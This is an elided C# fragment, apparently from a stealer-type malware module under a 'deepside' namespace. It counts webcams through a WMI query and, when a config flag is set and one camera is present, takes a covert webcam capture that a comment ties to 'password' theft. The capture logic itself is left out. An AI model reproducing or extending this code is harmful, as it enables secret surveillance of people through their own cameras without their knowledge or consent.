			...
			try
			{
				using (var searcher = new System.Management.ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"))
					foreach (var device in searcher.Get())
						cameras++;
			} catch { /*deepside.Logging.Log("GetConnectedCamerasCount : Query failed");*/ }
			return cameras;
		}

		// Create screenshot for password 
		public static bool Make(string sSavePath)
		{
			// If webcam disabled => skip
			if (deepside.Config.WebcamScreenshot != "1")
				return false;

			// If connected one camera
			int count = GetConnectedCamerasCount();
			if (count != 1)
				return false;//deepside.Logging.Log($"WebcamScreenshot : Camera screenshot failed. (Count {count})", false);
			...
			try
			{
				...
				return deepside.Logging.Log("WebcamScreenshot : Camera screenshot failed.\n" + ex, false);
			};
